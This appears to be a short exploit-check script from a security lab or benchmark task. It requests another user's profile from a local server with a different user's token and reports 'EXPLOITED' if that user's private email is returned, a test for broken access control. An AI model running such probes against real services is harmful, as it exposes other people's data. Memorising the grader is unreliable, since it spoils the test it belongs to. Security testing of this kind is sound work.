#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-8000}"
resp=$(curl -s "$BASE/profile/2?token=tok_alice")
if echo "$resp" | grep -q "bob-secret@ex.com"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
